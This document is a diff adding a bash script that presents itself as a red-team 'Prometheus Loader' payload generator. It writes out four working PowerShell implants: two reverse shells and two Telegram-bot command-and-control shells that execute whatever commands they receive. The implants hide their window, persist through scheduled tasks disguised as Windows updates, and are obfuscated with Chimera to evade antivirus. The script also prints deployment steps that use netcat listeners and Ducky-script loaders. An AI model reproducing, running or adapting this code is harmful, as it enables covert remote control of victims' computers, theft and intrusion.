@@ -1,0 +1,756 @@
+#!/bin/bash
+# File: pmtgener
+# PMTgenerator V1.0 - Unified Payload Generator for Prometheus Loader
+
+VERSION="1.0"
+SCRIPT_NAME="pmtgener"
+AUTHOR="Prometheus Loader Team"
+
+# Default values
+VERBOSE=0
+PAYLOAD_TYPE=""
+ENCRYPTION_LEVEL=5
+LHOST=""
+LPORT=""
+TOKEN=""
+ID=""
+CHIMERA_SCRIPT="./chimera.sh"
+
+# Colors for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
+# Function to print colored messages
+print_message() {
+    local color=$1
+    local message=$2
+    echo -e "${color}[*] ${message}${NC}"
+}
+
+print_success() {
+    echo -e "${GREEN}[+] $1${NC}"
+}
+
+print_error() {
+    echo -e "${RED}[-] $1${NC}"
+}
+
+print_warning() {
+    echo -e "${YELLOW}[!] $1${NC}"
+}
+
+print_info() {
+    echo -e "${CYAN}[i] $1${NC}"
+}
+
+# Function to show banner
+show_banner() {
+    echo -e "${BLUE}"
+    echo "╔══════════════════════════════════════════════════════╗"
+    echo "║               PMTgenerator V${VERSION}                      ║"
+    echo "║     Prometheus Loader - Unified Payload Generator    ║"
+    echo "╚══════════════════════════════════════════════════════╝"
+    echo -e "${NC}"
+}
+
+# Function to show help
+show_help() {
+    show_banner
+    echo "Usage: $SCRIPT_NAME [OPTIONS]"
+    echo ""
+    echo "OPTIONS:"
+    echo "  -h, --help           Show this help message and exit"
+    echo "  -V, --version        Show version and exit"
+    echo "  -v, --verbose        Enable verbosity during generation"
+    echo ""
+    echo "  -t, --type TYPE      Payload type (required)"
+    echo "                       Available types:"
+    echo "                         better_tg    - Advanced Telegram C2"
+    echo "                         standart     - Standard Reverse Shell"
+    echo "                         advanced     - Advanced Reverse Shell (persistence)"
+    echo "                         tg_shell     - Basic Telegram Shell"
+    echo ""
+    echo "  -EL, --encrypt-level (0-5)  Encryption level for chimera"
+    echo "                       0 = random, 1 = low, 2 = med, 3 = high,"
+    echo "                       4 = higher, 5 = insane (default: 5)"
+    echo ""
+    echo "  --output FILE        Output filename (default: based on type)"
+    echo ""
+    echo "TELEGRAM SHELLS OPTIONS (for better_tg and tg_shell):"
+    echo "  --token TOKEN        HTTP token for telegram bot"
+    echo "  --id ID              Telegram user ID for bot access control"
+    echo ""
+    echo "REVERSE SHELLS OPTIONS (for standart and advanced):"
+    echo "  --ip IP              Your local IP in wifi network"
+    echo "  --port PORT          Port for shell to connect"
+    echo ""
+    echo "EXAMPLES:"
+    echo "  $SCRIPT_NAME -t better_tg --token 123:ABC --id 456789"
+    echo "  $SCRIPT_NAME -t standart --ip 192.168.1.100 --port 4444"
+    echo "  $SCRIPT_NAME -t advanced --ip 10.0.0.5 --port 9001 -EL 4 -v"
+    echo ""
+}
+
+# Function to show version
+show_version() {
+    echo "PMTgenerator Version: $VERSION"
+    echo "Part of Prometheus Loader - Red Team Deployment Kit"
+    exit 0
+}
+
+# Function to validate IP address
+validate_ip() {
+    local ip=$1
+    if [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Function to validate port
+validate_port() {
+    local port=$1
+    if [[ $port =~ ^[0-9]+$ ]] && [ $port -ge 1 ] && [ $port -le 65535 ]; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Function to validate encryption level
+validate_encryption_level() {
+    local level=$1
+    if [[ $level =~ ^[0-5]$ ]]; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Function to detect local IP automatically
+detect_local_ip() {
+    local interfaces=("wlan0" "eth0" "en0" "enp0s3" "eth1")
+    
+    for iface in "${interfaces[@]}"; do
+        if ip addr show "$iface" &>/dev/null; then
+            LHOST=$(ip addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)
+            if [ -n "$LHOST" ]; then
+                print_info "Detected local IP on $iface: $LHOST"
+                return 0
+            fi
+        fi
+    done
+    
+    # Try alternative methods
+    LHOST=$(hostname -I 2>/dev/null | awk '{print $1}')
+    if [ -n "$LHOST" ]; then
+        print_info "Detected local IP: $LHOST"
+        return 0
+    fi
+    
+    print_warning "Could not detect local IP automatically"
+    return 1
+}
+
+# Function to check dependencies
+check_dependencies() {
+    local missing_deps=()
+    
+    # Check for required tools
+    if [ ! -f "$CHIMERA_SCRIPT" ]; then
+        print_error "Chimera script not found at: $CHIMERA_SCRIPT"
+        print_info "Make sure chimera.sh is in the same directory or specify path"
+        exit 1
+    fi
+    
+    if ! command -v bash &>/dev/null; then
+        missing_deps+=("bash")
+    fi
+    
+    if ! command -v sed &>/dev/null; then
+        missing_deps+=("sed")
+    fi
+    
+    if ! command -v awk &>/dev/null; then
+        missing_deps+=("awk")
+    fi
+    
+    if [ ${#missing_deps[@]} -ne 0 ]; then
+        print_error "Missing dependencies: ${missing_deps[*]}"
+        exit 1
+    fi
+    
+    if [ $VERBOSE -eq 1 ]; then
+        print_success "All dependencies met"
+    fi
+}
+
+# Function to generate better_tg payload
+generate_better_tg() {
+    local raw_file="raw_shell_tg_$$.ps1"
+    local output_file="${OUTPUT_FILE:-"crypt_shell_tg_$$.ps1"}"
+    
+    if [ -z "$TOKEN" ] || [ -z "$ID" ]; then
+        print_error "Token and ID are required for Telegram payloads"
+        exit 1
+    fi
+    
+    print_message "$CYAN" "Generating Advanced Telegram C2 payload..."
+    
+    # Create raw PowerShell file
+    cat <<EOF > "$raw_file"
+# 1. STEALTH
+\$w = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name "W" -Namespace "U" -PassThru
+\$w::ShowWindow(([DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow())::GetConsoleWindow(), 0)
+
+# 2. PERSISTENCE
+\$p = "\$env:APPDATA\Microsoft\Windows\tg_sys_check.ps1"
+if (!(Test-Path \$p)) {
+    Get-Content \$MyInvocation.MyCommand.Definition | Set-Content \$p
+    \$act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File \"\$p\""
+    \$trig = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -Action \$act -Trigger \$trig -TaskName "WindowsTGUpdate" -Force
+}
+
+# 3. CORE: Telegram C2 с Traceback
+\$token='$TOKEN'
+\$chatId='$ID'
+\$offset=0
+
+function Send-TG { param(\$txt)
+    try {
+        \$limit = 4000
+        if(\$txt.Length -gt \$limit) { \$txt = \$txt.Substring(0, \$limit) + "... [Текст обрезан]" }
+        \$body = @{ chat_id=\$chatId; text="[\$env:COMPUTERNAME] \$txt" }
+        Invoke-RestMethod -Uri "https://api.telegram.org\$token/sendMessage" -Method Post -Body \$body
+    } catch {}
+}
+
+while(\$true){
+    try {
+        \$url = "https://api.telegram.org\$token/getUpdates?timeout=20&offset=\$(\$offset + 1)"
+        \$upd = Invoke-RestMethod -Uri \$url
+        foreach(\$u in \$upd.result) {
+            \$offset = \$u.update_id
+            if(\$u.message.text) {
+                \$c = \$u.message.text
+                try {
+                    \$res = (Invoke-Expression \$c 2>&1 | Out-String)
+                    if ([string]::IsNullOrWhiteSpace(\$res)) { \$res = "Success (No Output)" }
+                    Send-TG -txt \$res
+                } catch {
+                    \$err = "CRITICAL ERROR:\r\nMessage: " + \$_.Exception.Message + 
+                           "\r\nScriptStack: " + \$_.ScriptStackTrace + 
+                           "\r\nCategory: " + \$_.CategoryInfo.ToString()
+                    Send-TG -txt \$err
+                }
+            }
+        }
+    } catch {
+        Start-Sleep -Seconds 10
+    }
+    Start-Sleep -Seconds 1
+}
+EOF
+    
+    if [ $VERBOSE -eq 1 ]; then
+        print_info "Created raw payload file: $raw_file"
+    fi
+    
+    # Obfuscate with Chimera
+    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
+    
+    if [ $VERBOSE -eq 1 ]; then
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
+    else
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
+    fi
+    
+    if [ $? -eq 0 ]; then
+        print_success "Payload generated successfully: $output_file"
+        print_info "Size: $(wc -c < "$output_file") bytes"
+        
+        # Cleanup
+        rm -f "$raw_file"
+        if [ $VERBOSE -eq 1 ]; then
+            print_info "Cleaned up temporary file: $raw_file"
+        fi
+        
+        # Show usage instructions
+        echo ""
+        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
+        print_info "1. Upload the payload to target system"
+        print_info "2. Execute with: powershell -ExecutionPolicy Bypass -File $output_file"
+        print_info "3. Send commands to your Telegram bot"
+        print_info "4. Check loader scripts for delivery methods"
+    else
+        print_error "Failed to obfuscate payload"
+        exit 1
+    fi
+}
+
+# Function to generate standard reverse shell
+generate_standart() {
+    local raw_file="raw_shell_std_$$.ps1"
+    local output_file="${OUTPUT_FILE:-"crypt_shell_std_$$.ps1"}"
+    
+    # Auto-detect LHOST if not provided
+    if [ -z "$LHOST" ]; then
+        if ! detect_local_ip; then
+            print_error "Please specify IP address with --ip option"
+            exit 1
+        fi
+    fi
+    
+    if [ -z "$LPORT" ]; then
+        print_error "Please specify port with --port option"
+        exit 1
+    fi
+    
+    if ! validate_ip "$LHOST"; then
+        print_error "Invalid IP address: $LHOST"
+        exit 1
+    fi
+    
+    if ! validate_port "$LPORT"; then
+        print_error "Invalid port: $LPORT"
+        exit 1
+    fi
+    
+    print_message "$CYAN" "Generating Standard Reverse Shell payload..."
+    print_info "LHOST: $LHOST, LPORT: $LPORT"
+    
+    # Create raw PowerShell file
+    cat <<EOF > "$raw_file"
+\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);
+\$stream = \$client.GetStream();
+[byte[]]\$bytes = 0..65535|%{0};
+while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
+    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
+    \$sendback = (iex \$data 2>&1 | Out-String );
+    \$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';
+    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
+    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
+    \$stream.Flush()
+};
+\$client.Close()
+EOF
+    
+    if [ $VERBOSE -eq 1 ]; then
+        print_info "Created raw payload file: $raw_file"
+    fi
+    
+    # Obfuscate with Chimera
+    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
+    
+    if [ $VERBOSE -eq 1 ]; then
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
+    else
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
+    fi
+    
+    if [ $? -eq 0 ]; then
+        print_success "Payload generated successfully: $output_file"
+        print_info "Size: $(wc -c < "$output_file") bytes"
+        
+        # Cleanup
+        rm -f "$raw_file"
+        if [ $VERBOSE -eq 1 ]; then
+            print_info "Cleaned up temporary file: $raw_file"
+        fi
+        
+        # Show usage instructions
+        echo ""
+        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
+        print_info "1. Start listener: nc -lvnp $LPORT"
+        print_info "2. Upload and execute payload on target"
+        print_info "3. Use stealth_loader.txt or main_loader.txt for delivery"
+    else
+        print_error "Failed to obfuscate payload"
+        exit 1
+    fi
+}
+
+# Function to generate advanced reverse shell
+generate_advanced() {
+    local raw_file="raw_shell_adv_$$.ps1"
+    local output_file="${OUTPUT_FILE:-"crypt_shell_adv_$$.ps1"}"
+    
+    # Auto-detect LHOST if not provided
+    if [ -z "$LHOST" ]; then
+        if ! detect_local_ip; then
+            print_error "Please specify IP address with --ip option"
+            exit 1
+        fi
+    fi
+    
+    if [ -z "$LPORT" ]; then
+        print_error "Please specify port with --port option"
+        exit 1
+    fi
+    
+    if ! validate_ip "$LHOST"; then
+        print_error "Invalid IP address: $LHOST"
+        exit 1
+    fi
+    
+    if ! validate_port "$LPORT"; then
+        print_error "Invalid port: $LPORT"
+        exit 1
+    fi
+    
+    print_message "$CYAN" "Generating Advanced Reverse Shell payload..."
+    print_info "LHOST: $LHOST, LPORT: $LPORT"
+    
+    # Create raw PowerShell file
+    cat <<EOF > "$raw_file"
+# 1. STEALTH: Немедленно прячем окно
+\$code = @'
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+'@
+\$type = Add-Type -MemberDefinition \$code -Name "Win32Utils" -Namespace "Util" -PassThru
+\$type::ShowWindow(\$type::GetConsoleWindow(), 0)
+
+# 2. PERSISTENCE: Самокопирование и создание задачи
+\$path = "\$env:APPDATA\Microsoft\Windows\win_update.ps1"
+if (! (Test-Path \$path)) {
+    Get-Content \$MyInvocation.MyCommand.Definition | Set-Content \$path
+    
+    \$taskName = "WindowsUpdateAutoCheck"
+    \$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File \"\$path\""
+    \$trigger = New-ScheduledTaskTrigger -AtLogOn
+    
+    Register-ScheduledTask -Action \$action -Trigger \$trigger -TaskName \$taskName -Description "Microsoft Update" -Force
+}
+
+# 3. CORE: Рекурсивный Reverse Shell (авто-реконнект)
+while(\$true) {
+    try {
+        \$c = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT)
+        \$s = \$c.GetStream()
+        \$b = New-Object Byte[] 65536
+        
+        while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0) {
+            \$d = (New-Object Text.ASCIIEncoding).GetString(\$b, 0, \$i)
+            \$out = (iex \$d 2>&1 | Out-String)
+            \$p = "PS " + (pwd).Path + "> "
+            \$res = ([Text.Encoding]::ASCII).GetBytes(\$out + \$p)
+            \$s.Write(\$res, 0, \$res.Length)
+        }
+    } catch { 
+        Start-Sleep -Seconds 30 
+    }
+}
+EOF
+    
+    if [ $VERBOSE -eq 1 ]; then
+        print_info "Created raw payload file: $raw_file"
+    fi
+    
+    # Obfuscate with Chimera
+    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
+    
+    if [ $VERBOSE -eq 1 ]; then
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
+    else
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
+    fi
+    
+    if [ $? -eq 0 ]; then
+        print_success "Payload generated successfully: $output_file"
+        print_info "Size: $(wc -c < "$output_file") bytes"
+        
+        # Cleanup
+        rm -f "$raw_file"
+        if [ $VERBOSE -eq 1 ]; then
+            print_info "Cleaned up temporary file: $raw_file"
+        fi
+        
+        # Show usage instructions
+        echo ""
+        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
+        print_info "1. Start listener: nc -lvnp $LPORT"
+        print_info "2. Payload includes persistence and stealth features"
+        print_info "3. Will auto-reconnect every 30 seconds if connection drops"
+    else
+        print_error "Failed to obfuscate payload"
+        exit 1
+    fi
+}
+
+# Function to generate basic telegram shell
+generate_tg_shell() {
+    local raw_file="raw_shell_basictg_$$.ps1"
+    local output_file="${OUTPUT_FILE:-"crypt_shell_basictg_$$.ps1"}"
+    
+    if [ -z "$TOKEN" ] || [ -z "$ID" ]; then
+        print_error "Token and ID are required for Telegram payloads"
+        exit 1
+    fi
+    
+    print_message "$CYAN" "Generating Basic Telegram Shell payload..."
+    
+    # Create raw PowerShell file
+    cat <<EOF > "$raw_file"
+# \$token='$TOKEN'
+\$chatId='$ID'
+\$offset=0
+while(\$true){
+try{
+\$updates=Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/getUpdates?timeout=5&offset=\$((\$offset + 1))"
+foreach(\$update in \$updates.result){
+\$offset=\$update.update_id
+if(\$update.message.text){
+\$msg=\$update.message.text
+Set-Clipboard -Value \$msg
+try{
+\$result=Invoke-Expression \$msg 2>&1 | Out-String
+Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/sendMessage" -Method Post -Body @{chat_id=\$chatId; text="\$result"}
+}catch{
+Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/sendMessage" -Method Post -Body @{chat_id=\$chatId; text="Error: \$_"}
+}
+}
+}
+}catch{}
+Start-Sleep -Seconds 1
+}
+EOF
+    
+    if [ $VERBOSE -eq 1 ]; then
+        print_info "Created raw payload file: $raw_file"
+    fi
+    
+    # Obfuscate with Chimera
+    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
+    
+    if [ $VERBOSE -eq 1 ]; then
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
+    else
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
+    fi
+    
+    if [ $? -eq 0 ]; then
+        print_success "Payload generated successfully: $output_file"
+        print_info "Size: $(wc -c < "$output_file") bytes"
+        
+        # Cleanup
+        rm -f "$raw_file"
+        if [ $VERBOSE -eq 1 ]; then
+            print_info "Cleaned up temporary file: $raw_file"
+        fi
+        
+        # Show usage instructions
+        echo ""
+        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
+        print_info "1. Simple Telegram C2 without advanced features"
+        print_info "2. Send commands directly to your bot"
+        print_info "3. Results will be sent back via Telegram"
+    else
+        print_error "Failed to obfuscate payload"
+        exit 1
+    fi
+}
+
+# Function to list available payload types
+list_payload_types() {
+    print_message "$BLUE" "Available Payload Types:"
+    echo ""
+    echo "  better_tg    - Advanced Telegram C2 with persistence and error handling"
+    echo "  standart     - Standard PowerShell Reverse Shell"
+    echo "  advanced     - Advanced Reverse Shell with stealth and persistence"
+    echo "  tg_shell     - Basic Telegram command and control"
+    echo ""
+    exit 0
+}
+
+# Main script execution
+main() {
+    # Parse command line arguments
+    while [[ $# -gt 0 ]]; do
+        case $1 in
+            -h|--help)
+                show_help
+                exit 0
+                ;;
+            -V|--version)
+                show_version
+                ;;
+            -v|--verbose)
+                VERBOSE=1
+                shift
+                ;;
+            -t|--type)
+                PAYLOAD_TYPE="$2"
+                if [[ ! "$PAYLOAD_TYPE" =~ ^(better_tg|standart|advanced|tg_shell)$ ]]; then
+                    print_error "Invalid payload type: $PAYLOAD_TYPE"
+                    list_payload_types
+                fi
+                shift 2
+                ;;
+            -EL|--encrypt-level)
+                ENCRYPTION_LEVEL="$2"
+                if ! validate_encryption_level "$ENCRYPTION_LEVEL"; then
+                    print_error "Invalid encryption level: $ENCRYPTION_LEVEL (must be 0-5)"
+                    exit 1
+                fi
+                shift 2
+                ;;
+            --output)
+                OUTPUT_FILE="$2"
+                shift 2
+                ;;
+            --ip)
+                LHOST="$2"
+                shift 2
+                ;;
+            --port)
+                LPORT="$2"
+                shift 2
+                ;;
+            --token)
+                TOKEN="$2"
+                shift 2
+                ;;
+            --id)
+                ID="$2"
+                shift 2
+                ;;
+            --list-types)
+                list_payload_types
+                ;;
+            *)
+                print_error "Unknown option: $1"
+                show_help
+                exit 1
+                ;;
+        esac
+    done
+    
+    # Show banner
+    if [ $VERBOSE -eq 1 ]; then
+        show_banner
+    fi
+    
+    # Check if payload type is specified
+    if [ -z "$PAYLOAD_TYPE" ]; then
+        print_error "Payload type is required. Use -t or --type"
+        echo ""
+        list_payload_types
+        exit 1
+    fi
+    
+    # Check dependencies
+    check_dependencies
+    
+    # Generate payload based on type
+    case $PAYLOAD_TYPE in
+        better_tg)
+            generate_better_tg
+            ;;
+        standart)
+            generate_standart
+            ;;
+        advanced)
+            generate_advanced
+            ;;
+        tg_shell)
+            generate_tg_shell
+            ;;
+        *)
+            print_error "Unknown payload type: $PAYLOAD_TYPE"
+            exit 1
+            ;;
+    esac
+    
+    # Show loader scripts info
+    echo ""
+    print_message "$YELLOW" "=== LOADER SCRIPTS ==="
+    print_info "Use the following Ducky Scripts for delivery:"
+    print_info "  stealth_loader.txt - Stealthy execution with cleanup"
+    print_info "  main_loader.txt    - Fast execution method"
+    print_info ""
+    print_info "Replace 'ENTERURLHERE' with your payload URL in loader scripts"
+}
+
+# Create README file
+create_readme() {
+    cat <<EOF > README_PMTGENER.md
+# PMTgenerator - Prometheus Loader Payload Generator
+
+## Overview
+Unified CLI tool for generating obfuscated PowerShell payloads for red team operations.
+
+## Installation
+1. Make the script executable:
+   \`\`\`bash
+   chmod +x pmtgener
+   \`\`\`
+
+2. Ensure all dependencies are in place:
+   \`\`\`bash
+   prometheus_loader/
+   ├── pmtgener
+   ├── chimera.sh
+   ├── generators/
+   ├── main_loader.txt
+   └── stealth_loader.txt
+   \`\`\`
+
+## Usage Examples
+
+### Telegram C2 (Advanced)
+\`\`\`bash
+./pmtgener -t better_tg --token "123456:ABC-DEF1234" --id 987654321
+\`\`\`
+
+### Standard Reverse Shell
+\`\`\`bash
+./pmtgener -t standart --ip 192.168.1.100 --port 4444 -EL 4
+\`\`\`
+
+### Advanced Reverse Shell with Auto-Detected IP
+\`\`\`bash
+./pmtgener -t advanced --port 9001 -v
+\`\`\`
+
+### Basic Telegram Shell
+\`\`\`bash
+./pmtgener -t tg_shell --token "123456:ABC-DEF1234" --id 987654321 --output malicious.ps1
+\`\`\`
+
+## Features
+- Unified interface for all payload types
+- Automatic IP detection
+- Chimera obfuscation integration
+- Multiple encryption levels (0-5)
+- Verbose mode for debugging
+- Clean temporary file management
+
+## Payload Types
+1. **better_tg** - Advanced Telegram C2 with persistence and error handling
+2. **standart** - Classic PowerShell reverse shell
+3. **advanced** - Reverse shell with stealth and persistence features
+4. **tg_shell** - Basic Telegram command execution
+
+## Delivery Methods
+Use the provided Ducky Scripts:
+- \`stealth_loader.txt\` - For stealthy execution
+- \`main_loader.txt\` - For fast execution
+
+Replace "ENTERURLHERE" in loader scripts with your payload URL.
+
+## Notes
+- Always test payloads in controlled environments
+- Use appropriate encryption levels based on target AV
+- Telegram tokens should be kept secure
+EOF
+}
+
+# Run main function
+main "$@"
